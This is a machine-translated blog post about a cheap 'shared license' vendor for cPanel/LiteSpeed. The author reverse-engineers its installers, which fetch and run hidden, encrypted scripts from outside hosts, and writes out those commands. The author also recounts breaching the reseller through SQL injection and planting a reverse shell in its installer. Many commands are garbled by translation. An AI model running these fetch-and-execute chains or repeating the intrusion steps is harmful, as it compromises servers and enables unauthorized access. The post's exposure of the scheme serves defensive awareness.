<html>
<head>
<title>Shared License or Crack? Access to 1000+ servers</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">共享许可还是破解？访问1000多台服务器</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/shared-license-or-crack-access-to-1000-servers-2c4d97b9b22b?source=collection_archive---------1-----------------------#2021-07-03">https://infosecwriteups.com/shared-license-or-crack-access-to-1000-servers-2c4d97b9b22b?source=collection_archive---------1-----------------------#2021-07-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="9ee8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向所有读者致敬，</p><p id="56e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">事实上，我想为我的主机服务器购买Cpanel和LiteSpeed许可证，所以我在谷歌上搜索，发现一些便宜的提供商说共享许可证。因为Cpanel只接受国际信用卡，而我没有，所以我在谷歌上搜索印度的信用卡提供商。</p><p id="2274" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通常，这些软件计划起价约为15-20美元/月，但一些网站如SKHOST、BALLIAHOST和许多其他网站显示，同样的计划起价约为3-5美元。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/4de9a74bc7e6a2bb6856ad5d857dfbc8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GCAdx4FLKdAHJ2jVo1tzEw.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kx"><img src="../Images/c834557f592b28bd60920279cb836241.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kRMQc8UkpNA1yMvGig6niQ.png"/></div></div></figure><blockquote class="ky kz la"><p id="44d5" class="jn jo lb jp b jq jr js jt ju jv jw jx lc jz ka kb ld kd ke kf le kh ki kj kk ij bi translated">所以都说<strong class="jp ir">共享许可没有破解完全安全</strong>，我真的是购买许可的新手，所以我落入他们的陷阱，支付了两者。</p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lf"><img src="../Images/24e8b6a3075530e5221c915320f8d4f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kWsK1dRYGQ-Tjsvqf3v6fA.png"/></div></div></figure><p id="423b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我支付了大约15美元，并检查了他们的客户区的许可证密钥。<br/>它显示运行某种命令来激活产品</p><blockquote class="ky kz la"><p id="aeca" class="jn jo lb jp b jq jr js jt ju jv jw jx lc jz ka kb ld kd ke kf le kh ki kj kk ij bi translated">rm -rf安装程序<br/> rm -rf设置<br/>wget license.skphost.net/litespeed/installer<br/>chmod+x安装程序<br/>。/installer<br/>skp host-LicenseLSWS</p></blockquote><p id="e620" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">真的吗？</p><p id="0f28" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以他们想让我为产品安装一些第三方脚本。</p><p id="48da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以基本上我是在为一些不知名的脚本付费，这些脚本的责任既不在Cpanel，也不在卖家；_;我想为什么不检查他们想要我运行的脚本，所以我启动了gdb来检查那些文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lg"><img src="../Images/e37ff220ecd3ac74d173abd69b85aa32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H3dMIkmqnehCVsGzEq5m-A.png"/></div></div></figure><p id="be64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个系统函数被调用，在设置一个断点后，我们可以检查寄存器的值。</p><blockquote class="ky kz la"><p id="939e" class="jn jo lb jp b jq jr js jt ju jv jw jx lc jz ka kb ld kd ke kf le kh ki kj kk ij bi translated">RM-RF/root/setup；CD/root；wget<a class="ae lh" href="http://litespeed.resellercenter.ir/litespeedv1/setup" rel="noopener ugc nofollow" target="_blank">http://litespeed.resellercenter.ir/litespeedv1/setup</a>T22】/dev/null 2&gt;T24】1；chmod+x setup<br/>PHP/root/setup</p></blockquote><p id="b00f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以这个脚本从另一个服务器获取一些PHP文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi li"><img src="../Images/964957be086e4840475a3d2d078674cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*01g0NoLbx2QCOPWGI4vhxw.png"/></div></div></figure><p id="5ab8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">整个脚本受Source Guardian保护。根据Source guardian网站的说法，“我们的PHP编码器通过将PHP源代码编译成二进制字节码格式来保护您的PHP代码，然后补充一个加密层。”<br/>所以我们无法从内存中获得正确的源代码，但我在媒体上找到了一篇由<a class="lj lk ep" href="https://medium.com/u/f73d48b47782?source=post_page-----2c4d97b9b22b--------------------------------" rel="noopener" target="_blank"> Chris Lyne </a>撰写的精彩文章。</p><blockquote class="ky kz la"><p id="fd18" class="jn jo lb jp b jq jr js jt ju jv jw jx lc jz ka kb ld kd ke kf le kh ki kj kk ij bi translated"><a class="ae lh" href="https://medium.com/tenable-techblog/dumping-php-opcodes-protected-by-sourceguardian-a0acd8058038" rel="noopener">https://medium . com/tenable-tech blog/dumping-PHP-opcodes-protected-by-source guardian-a0acd 8058038</a></p></blockquote><p id="6274" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用了Chris Lyne的技巧从文件中转储PHP操作码。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ll"><img src="../Images/161ee7deb9adb19fbfeffc41fe1734c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*74PtzE3XfG5ykc453KVpCA.png"/></div></div></figure><p id="f85a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">咔呜！！无红利(ex-dividend)</p><p id="90e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个脚本安装Proxychains、LiteSpeed，并获取更多的文件。<br/>除了他们的文件，还有一行引起了我的注意</p><blockquote class="ky kz la"><p id="e6cd" class="jn jo lb jp b jq jr js jt ju jv jw jx lc jz ka kb ld kd ke kf le kh ki kj kk ij bi translated">CD/usr/src；RM-RF lsws _ whm _ auto installer . sh；wget<a class="ae lh" href="https://www.litespeedtech.com/packages/cpanel/lsws_whm_autoinstaller.sh" rel="noopener ugc nofollow" target="_blank">https://www . litespeedtech . com/packages/cpanel/lsws _ whm _ auto installer . sh</a>；chmod a+x lsws _ whm _ auto installer . sh；。/lsws_whm_autoinstaller.sh试用1 0 admin WFI 9 fqh xxxxxxxxxxxx root @ localhost 1 1 '</p></blockquote><p id="6e67" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，运行安装lsw脚本的服务器将使用相同的LiteSpeed web控制台证书进行安装。</p><p id="32bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们再次分析这里得到的外部文件。</p><blockquote class="ky kz la"><p id="09cc" class="jn jo lb jp b jq jr js jt ju jv jw jx lc jz ka kb ld kd ke kf le kh ki kj kk ij bi translated">http://litespeed.resellercenter.ir/litespeedv1/RcLicense<a class="ae lh" href="http://litespeed.resellercenter.ir/litespeedv1/RcLicense_lsws" rel="noopener ugc nofollow" target="_blank">LSWS</a></p><p id="d2fa" class="jn jo lb jp b jq jr js jt ju jv jw jx lc jz ka kb ld kd ke kf le kh ki kj kk ij bi translated">root @ IP:/tmp/litespeed # file RcLicenseLSWS<br/>RcLicenseLSWS:ELF 64位LSB可执行文件，x86–64，版本1 (SYSV)，动态链接，解释器/lib 64/LD-Linux-x86–64 . so . 2，对于GNU/Linux 2.6.32，BuildID[sha1]= 1d 86 ee 60 CBF 26237 Bab 45 e 92 bb 19 e 5 da c19 BD 9 a 3，未剥离<br/>root @ IP:/</p></blockquote><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lm"><img src="../Images/bc98f01533128099ab500f786d23cf78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*562PE-yJ4zoEFVqobdwwgw.png"/></div></div></figure><p id="1dbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再次是获取其他文件的系统函数；-;</p><blockquote class="ky kz la"><p id="e70d" class="jn jo lb jp b jq jr js jt ju jv jw jx lc jz ka kb ld kd ke kf le kh ki kj kk ij bi translated">wget -O /usr/bin/。r license _ lsws<a class="ae lh" href="https://litespeed.resellercenter.ir/litespeedv2/seRcLicense_lsws" rel="noopener ugc nofollow" target="_blank">https://litespeed . resellercenter . IR/litespeed v2/seRcLicense _ lsws</a>/dev/null 2&gt;&amp;1<br/>OpenSSL AES-256-CBC-in/usr/bin/。r license _ lsws-out/usr/local/。vmfilsws-d-pass pass:xxxxxxxxxxxx<br/>PHP/usr/local/。vmfilsws<br/>comp 0-I/usr/local/。vmfilsws&gt;/dev/null 2&gt;T22】1<br/>umount/usr/local/。vmfilsws&gt;/dev/null 2&gt;&amp;1<br/>RM-RF/usr/local/。vmfilsws&gt;/dev/null 2&gt;&amp;1<br/>RM-RF/usr/bin/。r license _ lsws&gt;/dev/null 2&gt;&amp;1</p></blockquote><p id="92f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个seRcLicense是由OpenSSL编码的，但是等等，当密码在二进制文件本身中时有什么意义呢😆</p><p id="faf9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，解码后，它又是一个用Source Guardian编码的PHP文件，但我们可以像前面一样转储操作码。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ln"><img src="../Images/704b6d11e77d51b3eed9116335bb8948.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y5mcWBoa2YIzmanDx9ahEg.png"/></div></div></figure><p id="1f96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查后，不难理解他们如何阻止LiteSpeed服务器的所有流量，并将它们重定向到自己的服务器，并用socks one替换许可证。</p><p id="f119" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">反正这些二进制文件和PHP文件已经够多了。</strong></p><p id="f668" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们直接来到服务器访问头奖部分😈</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/c7bc61bb0281a36d0e700c39956bec13.png" data-original-src="https://miro.medium.com/v2/resize:fit:798/format:webp/1*Y8AtivohOdMngo8gjkYUiQ.png"/></div></figure><p id="f546" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我想我从印度卖家那里购买了这个许可证，他们从伊朗网站上转售这些，所以我运行了一些子域名和waybackurls的工具，得到了一些有趣的链接。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lp"><img src="../Images/3603b4439331dd666d7ea6428c9aa5a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*w61k_W6kvhNv10HQlCvNzA.png"/></div></div></figure><p id="ccc4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查了几个链接后，我发现其中一些容易受到SQLI的攻击。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lq"><img src="../Images/b0a4a2d403ec95ae21f1e7568c11a0e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rQTHhg1qVe9tbeijlUOwdw.png"/></div></div></figure><p id="909c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一张表中有900多个活动IP</p><p id="9591" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我查了verify.cpanel上的IPs。他们都没有一个有效的工作计划。</p><p id="31fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要么已过期，要么正在运行15天的试用期。</p><p id="20b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还记得用于配置的脚本中Litespeed的密码吗？<br/>我尝试从数据库中随机命中IP，并尝试登录</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lr"><img src="../Images/abf03b66191416aa8518efbf5e1d5859.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JIjZEfmMxXyBFKAsEuoYXQ.png"/></div></div></figure><p id="71b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但这不是我们感兴趣的，所以我尝试使用从链接中找到的凭证。瞧，它起作用了，在进入他们的网站后，我能够看到他们所有的数据和文件。</p><p id="7e05" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查他们的数据库，有9K+的IP，超过1000活跃。<br/> <br/>基本上，他们在运行一个完整的whmcs来销售这些脚本，这些脚本在购买时从用户那里获取一个IP(让他们相信他们的IP正在获得许可授权)。<br/>为了转售，他们制作了一个门户和wchms插件，为用户提供脚本。<br/>我只是在他们的一个安装程序脚本中放了一个反向shell，然后嘣</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ls"><img src="../Images/29d2783cbd4f891678b79794de9b9335.png" data-original-src="https://miro.medium.com/v2/resize:fit:584/format:webp/1*C5ylNvuURNF79rZACbpe_w.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi lt"><img src="../Images/b6078b49fea328d2d62c0baa8ea1435f.png" data-original-src="https://miro.medium.com/v2/resize:fit:296/format:webp/1*rlpbHPMK4yrs3zFAEQ4ToQ.png"/></div></figure><p id="36c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我可以修改或添加任何我想要的东西，而获取这些文件的服务器会盲目地运行它。</p><p id="2f4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯，这只是从一个单一的供应商，但如果你谷歌购买便宜的Cpanel，Whcms，LiteSpeed等软件或共享许可证，你会发现数以千计的网站出售这些类型的廉价破解。以销售共享许可的名义，他们强迫你安装他们自己的脚本。总之，我白白浪费了大约15美元，后来不得不再次从主网站上购买许可证。</p><p id="3258" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结论——永远不要相信互联网上的廉价替代品，停止使用破解/无效软件。</p></div></div>    
</body>
</html>